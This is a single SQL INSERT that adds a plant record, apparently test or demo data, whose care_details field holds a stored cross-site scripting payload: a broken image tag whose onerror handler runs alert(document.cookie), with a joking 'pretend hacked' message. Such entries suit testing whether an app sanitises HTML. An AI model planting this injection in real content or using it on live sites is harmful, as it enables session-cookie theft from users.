INSERT INTO plants (id, name, plant_type, toxicity, care_details)
VALUES
  (9000, 'hahahaha', 'Other', 'Pet-safe',
    'This text contains an intentionally broken image <img src="https://url.to.file.which/does-not.exist" onerror="alert(document.cookie); alert(''you just got pretend hacked! oh noes!'');">. The image will try to load, when it fails, <strong>it executes malicious JavaScript</strong>');